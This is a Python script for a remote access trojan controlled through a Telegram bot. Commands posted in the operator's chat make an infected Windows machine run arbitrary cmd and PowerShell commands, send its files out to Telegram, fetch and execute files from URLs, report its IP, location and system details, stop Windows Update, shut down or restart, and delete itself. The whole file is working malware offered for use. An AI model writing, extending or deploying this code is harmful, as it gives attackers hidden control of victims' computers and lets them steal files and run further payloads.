import ctypes
import telebot
import platform
import subprocess
import os
import requests
from pathlib import Path

BOT_TOKEN = "token_bot"
GROUP_CHAT_ID = "chat_id"

bot = telebot.TeleBot(BOT_TOKEN)
HOSTNAME = platform.node()
SCRIPT_PATH = os.path.abspath(__file__)

def execute_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout or result.stderr

def send_file(filename):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    with open(filename, 'rb') as file:
        files = {'document': file}
        data = {'chat_id': GROUP_CHAT_ID}
        response = requests.post(url, data=data, files=files)
        if response.status_code != 200:
            print(f"Failed to send file.")

@bot.message_handler(func=lambda message: str(message.chat.id) == str(GROUP_CHAT_ID))
def handle_message(message):
    text = message.text.strip()

    if text.startswith('!cmd'):
        command = text[5:]
        if command:
            output = execute_command(command)
            bot.reply_to(message, f"Result of command:\n{output}")
        else:
            bot.reply_to(message, "Please write a command after !cmd.")
    
    elif text.startswith('!open_url'):
        url = text[10:].strip()
        if url:
            output = execute_command(f'start "" "{url}"')
            bot.reply_to(message, f"URL successfully opened!\n{output}")
        else:
            bot.reply_to(message, "Error opening URL, please provide a valid URL.")

    elif text.startswith('!hide_url'):
        url = text[10:].strip()
        if url:
            output = execute_command(f'curl -s "{url}"')
            bot.reply_to(message, f"URL fetched successfully in hidden mode!\n{output}")
        else:
            bot.reply_to(message, "Error fetching URL in hidden mode, please provide a valid URL.")

    elif text.startswith('!shutdown'):
        output = execute_command('shutdown /s /f /t 0')
        bot.reply_to(message, "PC shutting down...")

    elif text.startswith('!sleep'):
        output = execute_command('rundll32.exe powrprof.dll,SetSuspendState Sleep')
        bot.reply_to(message, "PC going to sleep...")

    elif text.startswith('!update'):
        output = execute_command('powershell Install-Module PSWindowsUpdate -Force; Install-WindowsUpdate -AcceptAll -AutoReboot')
        bot.reply_to(message, "PC updating...")

    elif text.startswith('!hibernate'):
        output = execute_command('shutdown /h')
        bot.reply_to(message, "PC hibernating...")

    elif text.startswith('!restart'):
        output = execute_command('shutdown /r /f /t 0')
        bot.reply_to(message, "PC restarting...")

    elif text.startswith('!stop_updates'):
        output = execute_command('sc stop wuauserv')
        bot.reply_to(message, "Windows updates stopped.")

    elif text.startswith('!shell'):
        command = text[7:]
        if command:
            output = execute_command(f"powershell -Command \"{command}\"")
            bot.reply_to(message, f"Result of powershell command:\n{output}")
        else:
            bot.reply_to(message, "Please write a command after !shell")

    elif text.startswith('!upload'):
        file_path = text[7:].strip()
        if os.path.exists(file_path):
            with open(file_path, 'rb') as file:
                bot.send_document(message.chat.id, file, caption=f"File {file_path}")
        else:
            bot.reply_to(message, "The file does not exist.")

    elif text.startswith('!download'):
        file_url = text[10:].strip()
        response = requests.get(file_url)
        if response.status_code == 200:
            file_name = file_url.split('/')[-1]
            with open(file_name, 'wb') as file:
                file.write(response.content)
            output = execute_command(file_name)
            bot.reply_to(message, f"Result of execution of {file_name}:\n{output}")
        else:
            bot.reply_to(message, "Error downloading file.")

    elif text.startswith('!ip'):
        response = requests.get('http://ip-api.com/json')
        if response.status_code == 200:
            data = response.json()
            bot.reply_to(message, f"IP: {data['query']}\nCountry: {data['country']}\nCity: {data['city']}\nTimezone: {data['timezone']}")
        else:
            bot.reply_to(message, "Error getting IP information.")

    elif text.startswith('!kms'):
        os.remove(__file__)
        bot.reply_to(message, "File deleted.")

    elif text.startswith('!sysinfo'):
        system_info = {
            'Platform': platform.platform(),
            'System': platform.system(),
            'Node Name': platform.node(),
            'Release': platform.release(),
            'Version': platform.version(),
            'Machine': platform.machine(),
            'Processor': platform.processor(),
            'CPU Cores': os.cpu_count(),
            'Username': os.getlogin(),
        }
        bot.reply_to(message, '\n'.join(f"{key}: {value}" for key, value in system_info.items()))

    elif text.startswith('!path'):
        bot.reply_to(message, f"Script path: {SCRIPT_PATH}")

    elif text == '!check':
        bot.reply_to(message, f"Connected - {HOSTNAME}")

    elif text == '!help':
        help_text = (
            "<b>!cmd &lt;command&gt;</b> : <i>run commands.</i>\n"
            "<b>!shell &lt;command&gt;</b> : <i>run shell commands.</i>\n"
            "<b>!upload &lt;file_path&gt;</b> : <i>download file (enter the file path).</i>\n"
            "<b>!download &lt;file_url&gt;</b> : <i>download file from URL and run it.</i>\n"
            "<b>!ip</b> : <i>get IP info of the client.</i>\n"
            "<b>!kms</b> : <i>self-delete client file.</i>\n"
            "<b>!check</b> : <i>check if the client is connected.</i>\n"
            "<b>!sysinfo</b> : <i>get system information.</i>\n"
            "<b>!path</b> : <i>get the path of the script.</i>\n"
        )
        bot.reply_to(message, help_text, parse_mode='HTML')

bot.polling()
